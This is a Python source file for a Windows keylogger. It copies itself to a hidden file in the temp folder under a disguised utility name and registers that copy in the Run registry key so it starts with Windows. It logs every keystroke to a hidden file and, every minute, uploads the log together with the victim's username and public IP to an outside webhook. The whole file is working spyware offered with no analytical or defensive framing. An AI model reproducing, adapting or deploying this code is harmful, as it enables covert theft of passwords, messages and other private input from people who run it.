import ctypes
import sys
import requests
import threading
import time
import os
import shutil
import winreg as reg
from getpass import getuser
from pynput.keyboard import Listener
import tokens
from pymongo import MongoClient

##
u = getuser()
path_l = os.path.expandvars(f'%TEMP%//{u}_system_meta.txt')
path_e = os.path.expandvars(f'%TEMP%//AGDInvokerUtility.exe')
webhook_url = tokens.webhook_url
uri = tokens.mongo_uri
client = MongoClient(uri)
#startup = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\essens.exe'
##

#identification
current_file = sys.executable
try:
    ip = public_ip = requests.get('https://api.ipify.org').text
    with open(path_l, "a") as f:
        f.write(f"\n{u} {ip}\n")
except:
    pass

#hide and add to startup with registry
try:
    shutil.copy2(current_file, path_e)
    attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e, 0x02)
except:
    pass
create_reg = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
open_key = reg.OpenKey(create_reg, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, reg.KEY_ALL_ACCESS)
try:
    reg.SetValueEx(open_key, 'AGDInvokerUtility', 0, reg.REG_SZ, path_e)
except:
    pass


#log cleaner function
def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.cmd":
        keydata = "-WIN-"
    if keydata == "Key.shift" or keydata == "Key.shift_r":
        keydata = ""
    if keydata == "Key.backspace":
        keydata = "-BACK-"
    if keydata == "Key.alt_l" or keydata == "Key.alt_r":
        keydata = "-ALT-"
    if keydata == "Key.tab":
        keydata = "-TAB-"
    if keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
        keydata = "-CTRL-"
    with open(path_l, "a") as f:
        f.write(keydata)
    ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)

#sending logfile
def send_logfile(): 

    with open(path_l, "rb") as f:
        files = {"file": (path_l, f)}
        attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_l, 0x02)
    try:
            response = requests.post(webhook_url, files=files)
            print(response.status_code)
    except:
        pass
    #schedule next send in 1 minute
    threading.Timer(60, send_logfile).start()
    file_stat = os.stat(path_l)
    if file_stat.st_size > 7000000:
        with open(path_l, "w") as f:
            f.write("")


#time interval between sending logs
threading.Timer(60, send_logfile).start()

#start listening to keyboard
with Listener(on_press=writetofile) as l:
    l.join()
